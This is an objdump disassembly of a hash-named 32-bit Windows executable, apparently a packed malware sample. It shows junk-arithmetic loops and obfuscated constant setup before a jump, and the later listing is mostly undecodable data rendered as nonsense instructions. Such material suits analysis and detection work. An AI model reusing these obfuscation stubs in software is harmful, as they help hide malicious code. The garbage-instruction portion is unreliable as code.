
96a11eb59edef75b9f6ca4e8c032a04ae43ebad4fba196cc0f74b2ec785c6e69.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c26
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d32
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x423832
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238f9
  4012ea:	push   0x42397d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	inc    ecx
  40143e:	sbb    DWORD PTR [edx-0x2a],esp
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	jmp    0x7182872f
  40145a:	daa    
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   ebx,eax
  401504:	cmp    al,0x47
  401506:	lea    edi,[edx]
  401508:	js     0x4014d1
  40150a:	test   DWORD PTR [ebx+0x4fa91073],edi
  401510:	xor    eax,0x5e5ba236
  401515:	push   edi
  401516:	pop    edi
  401517:	mov    ecx,0xa66fd469
  40151c:	xchg   edi,eax
  40151d:	xchg   edi,edi
  40151f:	or     al,0x7c
  401521:	and    al,0xec
  401523:	sbb    BYTE PTR [ebp-0x6c8d6fd3],bh
  401529:	int3   
  40152a:	xchg   edx,eax
  40152b:	and    eax,0x47d36cee
  401530:	outs   dx,DWORD PTR ds:[esi]
  401531:	dec    edx
  401532:	stc    
  401533:	sar    edx,1
  401535:	lods   al,BYTE PTR ds:[esi]
  401536:	or     eax,edx
  401538:	push   ebp
  401539:	adc    BYTE PTR [eax],ch
  40153b:	fcomi  st,st(4)
  40153d:	in     eax,0x24
  40153f:	push   ecx
  401540:	mov    DWORD PTR [edx],0x61520fb5
  401546:	shl    BYTE PTR [ebp-0x35d3dfe8],1
  40154c:	dec    ebp
  40154d:	xor    ebp,ecx
  40154f:	and    al,0xd0
  401551:	jle    0x4014e7
  401553:	cld    
  401554:	inc    ecx
  401555:	mov    eax,ds:0x30e7a78c
  40155a:	dec    ebp
  40155b:	xchg   ebp,eax
  40155c:	jo     0x401526
  40155e:	ins    BYTE PTR es:[edi],dx
  40155f:	enter  0x39b3,0xc7
  401563:	clc    
  401564:	les    edi,FWORD PTR [ecx+ebx*1-0x18514b37]
  40156b:	and    eax,0x8b5c7a55
  401570:	or     eax,0x133e29a7
  401575:	arpl   WORD PTR [edx+0x3b6e7b1b],bp
  40157b:	aam    0xda
  40157d:	int    0x8c
  40157f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401580:	(bad)  
  401581:	fnstcw WORD PTR [esi+0x1b]
  401584:	daa    
  401585:	retf   
  401586:	xchg   ebx,eax
  401587:	ins    DWORD PTR es:[edi],dx
  401588:	fild   WORD PTR [ebx+0x6298293]
  40158e:	ror    BYTE PTR [esi],0x62
  401591:	and    edi,esp
  401593:	ins    BYTE PTR es:[edi],dx
  401594:	and    al,0x6d
  401596:	jnp    0x40158d
  401598:	push   edx
  401599:	cli    
  40159a:	sub    al,BYTE PTR [edx*8+0x15b9fbcb]
  4015a1:	and    eax,0x6da66397
  4015a6:	or     eax,0xb75ae31f
  4015ab:	mov    bh,0x17
  4015ad:	push   edi
  4015ae:	inc    esi
  4015af:	clc    
  4015b0:	ja     0x401563
  4015b2:	in     eax,0x28
  4015b4:	ds mov ah,0x68
  4015b7:	lods   al,BYTE PTR ds:[esi]
  4015b8:	dec    edi
  4015b9:	pop    ss
  4015ba:	xchg   esi,eax
  4015bb:	xor    edi,edx
  4015bd:	in     al,0xe9
  4015bf:	loop   0x4015ba
  4015c1:	test   BYTE PTR [ebx-0x5d],bl
  4015c4:	mov    eax,0xc0887c5d
  4015c9:	jo     0x40156a
  4015cb:	xchg   ecx,eax
  4015cc:	jg     0x4015d2
  4015ce:	fdivp  st(3),st
  4015d0:	in     eax,0x31
  4015d2:	test   BYTE PTR [edi-0x26965e03],dh
  4015d8:	jae    0x401601
  4015da:	sub    bl,BYTE PTR [ebx+0x3b]
  4015dd:	lock xor DWORD PTR [ecx],esi
  4015e0:	sti    
  4015e1:	(bad)  
  4015e2:	mov    ds:0xda7dcb62,al
  4015e7:	inc    ebx
  4015e8:	xor    BYTE PTR [ebx-0xc],bl
  4015eb:	mov    eax,0xef66a9e2
  4015f0:	jns    0x40157b
  4015f2:	push   esp
  4015f3:	or     eax,0xb3dd9f78
  4015f8:	call   0x190850de
  4015fd:	and    al,0x35
  4015ff:	pop    edi
  401600:	mov    ah,0x2d
  401602:	call   0xdb32:0x553296af
  401609:	vfmsub231ps xmm0,xmm7,XMMWORD PTR [edi-0x5d]
  40160f:	add    edx,edx
  401611:	cld    
  401612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401613:	clc    
  401614:	(bad)  
  401615:	jb     0x401674
  401617:	cwde   
  401618:	vfnmsub213sd xmm2{k4}{z},xmm1,(bad)
  401619:	shl    BYTE PTR [ebp+0x3d91afd4],cl
  40161f:	fcomp  DWORD PTR [edi+0x1e38c986]
  401625:	ffreep st(4)
  401627:	mov    edi,0x99db8f59
  40162c:	test   BYTE PTR [ebx-0xb],cl
  40162f:	fnstsw WORD PTR [edi+eiz*8]
  401632:	mov    al,ds:0x9038c28d
  401637:	adc    eax,0x71d31ced
  40163c:	xchg   esp,eax
  40163d:	js     0x4016b0
  40163f:	xor    al,0x4a
  401641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401642:	loopne 0x401649
  401644:	popf   
  401645:	jo     0x401661
  401647:	jne    0x40169e
  401649:	push   ds
  40164a:	and    dh,BYTE PTR [edi+0x69]
  40164d:	xchg   edi,eax
  40164e:	pop    ebp
  40164f:	fimul  DWORD PTR [esi-0x3988ebdf]
  401655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401656:	rcl    DWORD PTR [ebp-0x32],0x4e
  40165a:	mov    eax,0x4755a878
  40165f:	(bad)  
  401660:	punpckldq mm1,DWORD PTR [eax+0x4cff2089]
  401667:	ret    
  401668:	push   es
  401669:	mov    ebp,0x1cc13c0e
  40166e:	mov    edi,0x23ec24e5
  401673:	inc    eax
  401674:	bound  ebp,QWORD PTR [eax+0x138b00db]
  40167a:	inc    esi
  40167b:	mov    ds:0xb4a71d77,al
  401680:	and    DWORD PTR [ebp-0x54],edi
  401683:	sub    eax,0x4bb5de15
  401688:	scas   al,BYTE PTR es:[edi]
  401689:	and    bl,dl
  40168b:	and    al,BYTE PTR [edi+0x4d3dc950]
  401691:	arpl   WORD PTR [eax+0x2f7f726e],sp
  401697:	dec    edi
  401698:	mov    ah,0x7b
  40169a:	inc    eax
  40169b:	cs ss mov edi,cs
  40169f:	mov    ebp,0xfe927615
  4016a4:	sahf   
  4016a5:	xchg   ecx,eax
  4016a6:	pop    es
  4016a7:	das    
  4016a8:	xchg   esi,eax
  4016a9:	das    
  4016aa:	sub    DWORD PTR [edx],ebp
  4016ac:	retf   
  4016ad:	push   ebp
  4016ae:	pop    ecx
  4016af:	aas    
  4016b0:	js     0x40164a
  4016b2:	pop    esi
  4016b3:	mov    al,0x80
  4016b5:	push   es
  4016b6:	add    ch,BYTE PTR [edi+edi*1-0x59]
  4016ba:	(bad)  
  4016bb:	icebp  
  4016bc:	loopne 0x401695
  4016be:	xor    ch,BYTE PTR [edx-0x13]
  4016c1:	ins    BYTE PTR es:[edi],dx
  4016c2:	ja     0x4016b3
  4016c4:	(bad)  
  4016c5:	int3   
  4016c6:	xchg   DWORD PTR [esi+0x721b74ab],ecx
  4016cc:	cmc    
  4016cd:	loop   0x40174e
  4016cf:	aad    0xeb
  4016d1:	test   BYTE PTR [ecx+0x41],al
  4016d4:	es out 0x49,eax
  4016d7:	int3   
  4016d8:	sbb    eax,0xc2820b0c
  4016dd:	loope  0x401699
  4016df:	pop    eax
  4016e0:	loopne 0x401729
  4016e2:	and    DWORD PTR [edi-0x49cdaf9a],0x2b
  4016e9:	mov    dl,0xf
  4016eb:	pop    esi
  4016ec:	mov    edi,0x3373aa56
  4016f1:	stos   BYTE PTR es:[edi],al
  4016f2:	mov    ds:0xd32dd1e6,al
  4016f7:	cld    
  4016f8:	out    dx,eax
  4016f9:	add    DWORD PTR [ebx],ecx
  4016fb:	jp     0x40174f
  4016fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016fe:	test   edi,esi
  401700:	adc    eax,0xb66243fc
  401705:	xchg   BYTE PTR [edi+0x34101d7e],al
  40170b:	punpckhdq mm3,QWORD PTR ds:0xff3729e8
  401712:	sbb    esi,DWORD PTR [edx-0x2bdca4d3]
  401718:	push   esi
  401719:	fcom   DWORD PTR [eax+0x25]
  40171c:	cmp    dh,BYTE PTR [eax]
  40171e:	in     al,0x80
  401720:	sti    
  401721:	pop    ecx
  401722:	cmp    al,0x5a
  401724:	loop   0x4016ed
  401726:	mov    al,0x6f
  401728:	lock bound ebp,QWORD PTR gs:[ebp+0x61]
  40172d:	inc    edi
  40172e:	jg     0x401723
  401730:	js     0x4016fb
  401732:	inc    edi
  401733:	adc    eax,0x5c17bbb8
  401738:	imul   edi,DWORD PTR [ebp+0x38],0x4b
  40173c:	retf   0xb5b2
  40173f:	or     al,0x5
  401741:	mov    ecx,0x52c8caa1
  401746:	xchg   ecx,eax
  401747:	dec    ebp
  401748:	in     eax,dx
  401749:	clc    
  40174a:	(bad)  
  40174b:	out    0x95,al
  40174d:	gs or  al,0xf8
  401750:	lds    eax,FWORD PTR [edx-0x60110676]
  401756:	dec    ebx
  401757:	mov    esp,0x85a5971e
  40175c:	adc    DWORD PTR [edi+0x79],edx
  40175f:	bound  ecx,QWORD PTR [esi+0x6b]
  401762:	mov    ebx,0x9ca5ba15
  401767:	mov    ds:0xca98df92,al
  40176c:	xor    esi,0xffffff96
  40176f:	sti    
  401770:	aad    0x59
  401772:	sti    
  401773:	call   0xef91c200
  401778:	mul    DWORD PTR [eax+0x2f8f7b6c]
  40177e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40177f:	fild   WORD PTR [ecx+eiz*1+0x30]
  401783:	iret   
  401784:	mov    bl,0xb1
  401786:	add    eax,0x4ea8f7bc
  40178b:	pop    ebx
  40178c:	call   0xbc78:0x64a5c887
  401793:	test   DWORD PTR [edi-0x1ce81689],edx
  401799:	sub    bl,al
  40179b:	and    al,0x65
  40179d:	sbb    DWORD PTR [ecx+esi*8-0x2b],eax
  4017a1:	stos   DWORD PTR es:[edi],eax
  4017a2:	sbb    BYTE PTR [ecx+0x27eb7a28],dl
  4017a8:	xchg   BYTE PTR [ebp+0x41],ah
  4017ab:	fisttp QWORD PTR [edi]
  4017ad:	mov    DWORD PTR [ecx],edi
  4017af:	(bad)  
  4017b0:	(bad)  
  4017b1:	sti    
  4017b2:	push   cs
  4017b3:	mov    esi,0x57cbd6e4
  4017b8:	cmp    DWORD PTR ds:0xbd52d9d0,ebp
  4017be:	pop    esi
  4017bf:	ins    DWORD PTR es:[edi],dx
  4017c0:	xchg   DWORD PTR [eax+esi*2-0x4c],edi
  4017c4:	push   0x24
  4017c6:	arpl   WORD PTR [edi],dx
  4017c8:	mov    dl,0xf5
  4017ca:	push   cs
  4017cb:	adc    al,bh
  4017cd:	lahf   
  4017ce:	inc    DWORD PTR [eax]
  4017d0:	add    BYTE PTR [ecx+edi*4-0x1ba8be3c],ah
  4017d7:	xor    dl,ah
  4017d9:	mov    eax,ds:0xf4432
  4017de:	push   ss
  4017df:	cmp    bh,dl
  4017e1:	push   edx
  4017e2:	jne    0x4017ac
  4017e4:	mov    gs,esp
  4017e6:	adc    al,0xde
  4017e8:	mov    ds,WORD PTR [ecx]
  4017ea:	jbe    0x4017dc
  4017ec:	cmp    ebx,ecx
  4017ee:	aam    0x65
  4017f0:	jle    0x401783
  4017f2:	(bad)  
  4017f3:	mov    al,ds:0x2a6aec3e
  4017f8:	clc    
  4017f9:	sahf   
  4017fa:	call   0x7e13:0x5137c413
  401801:	stc    
  401802:	ds sti 
  401804:	dec    edi
  401805:	mov    bl,0x87
  401807:	lods   al,BYTE PTR ds:[esi]
  401808:	ds inc ebp
  40180a:	sbb    BYTE PTR [ebp+0x8],cl
  40180d:	test   al,0x2a
  40180f:	int3   
  401810:	ret    0xbcc7
  401813:	pop    ecx
  401814:	mov    ds:0xc63aad21,eax
  401819:	cld    
  40181a:	pop    ebp
  40181b:	aas    
  40181c:	and    dl,BYTE PTR [esi-0x5d]
  40181f:	adc    BYTE PTR [edi+esi*2],ch
  401822:	sbb    ecx,eax
  401824:	pop    eax
  401825:	lods   eax,DWORD PTR ds:[esi]
  401826:	mov    esp,?
  401828:	or     al,0x71
  40182a:	pushf  
  40182b:	popf   
  40182c:	ds (bad) 
  40182e:	mov    bl,0xaf
  401830:	pop    eax
  401831:	push   0xffffffeb
  401833:	fld    DWORD PTR [esi]
  401835:	pop    esi
  401836:	cwde   
  401837:	retf   0x1f4d
  40183a:	pushf  
  40183b:	(bad)  
  40183c:	jnp    0x4018a7
  40183e:	aas    
  40183f:	and    BYTE PTR [eax+0x36],dl
  401842:	popf   
  401843:	and    eax,0x5bee7933
  401848:	iret   
  401849:	push   ss
  40184a:	outs   dx,DWORD PTR ds:[esi]
  40184b:	stc    
  40184c:	enter  0x214a,0xe1
  401850:	add    al,dl
  401852:	pusha  
  401853:	adc    bl,dh
  401855:	push   eax
  401856:	aad    0x8f
  401858:	ins    BYTE PTR es:[edi],dx
  401859:	adc    ebp,ebx
  40185b:	mov    ds:0x70f8c705,al
  401860:	jmp    0x401840
  401862:	inc    esi
  401863:	push   ecx
  401864:	push   ebp
  401865:	mov    bh,0x71
  401867:	cs pop ecx
  401869:	test   eax,0xfc8d921d
  40186e:	jae    0x401853
  401870:	retf   
  401871:	sub    BYTE PTR ds:0x9609614a,0x76
  401878:	nop
  401879:	adc    BYTE PTR [eax-0x1ac27134],al
  40187f:	jae    0x4018fd
  401881:	gs test al,0xcb
  401884:	cmc    
  401885:	das    
  401886:	adc    al,0x30
  401888:	(bad)  
  401889:	and    ah,dh
  40188b:	ret    
  40188c:	add    bl,ch
  40188e:	(bad)  
  40188f:	in     eax,0xa1
  401891:	imul   esi,eax,0xba49e9d1
  401897:	jae    0x40182a
  401899:	sbb    DWORD PTR [esi+0x27e39319],esp
  40189f:	repz xor eax,0x44fbe303
  4018a5:	push   ss
  4018a6:	outs   dx,BYTE PTR ds:[esi]
  4018a7:	nop
  4018a8:	popa   
  4018a9:	mov    edi,0xec97c83b
  4018ae:	mov    ah,0xc7
  4018b0:	push   ebp
  4018b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018b2:	stos   DWORD PTR es:[edi],eax
  4018b3:	jnp    0x401922
  4018b5:	out    0x19,al
  4018b7:	or     esp,ebx
  4018b9:	push   cs
  4018ba:	lock out 0x5e,eax
  4018bd:	inc    ebp
  4018be:	jne    0x4018b9
  4018c0:	push   0xc855799d
  4018c5:	cmc    
  4018c6:	stos   DWORD PTR es:[edi],eax
  4018c7:	mov    WORD PTR [ecx+ecx*1-0x9c06b06],ds
  4018ce:	or     BYTE PTR [eax+0x5a],ah
  4018d1:	rol    DWORD PTR [edx-0x5a843946],1
  4018d7:	mov    WORD PTR [eax],?
  4018d9:	or     eax,0x88714d96
  4018de:	test   al,0x65
  4018e0:	loop   0x401891
  4018e2:	xchg   ebp,eax
  4018e3:	daa    
  4018e4:	call   0xe0d645d0
  4018e9:	daa    
  4018ea:	sbb    BYTE PTR [eax],ch
  4018ec:	fdiv   st,st(4)
  4018ee:	inc    ecx
  4018ef:	rcl    DWORD PTR [ebp+0x1c],1
  4018f2:	jae    0x401933
  4018f4:	es mov eax,0x183f274d
  4018fa:	out    dx,eax
  4018fb:	stc    
  4018fc:	sbb    DWORD PTR [edx-0x34],ebx
  4018ff:	ja     0x401920
  401901:	xor    ah,BYTE PTR ds:0x18be4271
  401907:	sub    al,0xa7
  401909:	rol    ch,1
  40190b:	pop    edx
  40190c:	loopne 0x4018cc
  40190e:	mov    WORD PTR [eax+0xbe9c05e],es
  401914:	loope  0x4018f9
  401916:	push   ebp
  401917:	add    al,0xe1
  401919:	(bad)  
  40191b:	add    BYTE PTR [ebp-0x418377b6],cl
  401921:	xchg   ch,ah
  401923:	and    al,0x98
  401925:	clc    
  401926:	xchg   ecx,eax
  401927:	and    DWORD PTR [edx+edx*4-0x8bb4e36],ebp
  40192e:	call   FWORD PTR [eax]
  401930:	out    dx,al
  401931:	sbb    eax,0x92923b80
  401936:	mov    eax,ds:0x1f97173d
  40193b:	sub    eax,0x1457d236
  401940:	imul   esp,DWORD PTR [edi+ebp*4+0x14],0xa4b29e07
  401948:	adc    eax,0xecbbd987
  40194d:	xor    al,0x98
  40194f:	jae    0x401994
  401951:	retf   0x668f
  401954:	fldenv [edi]
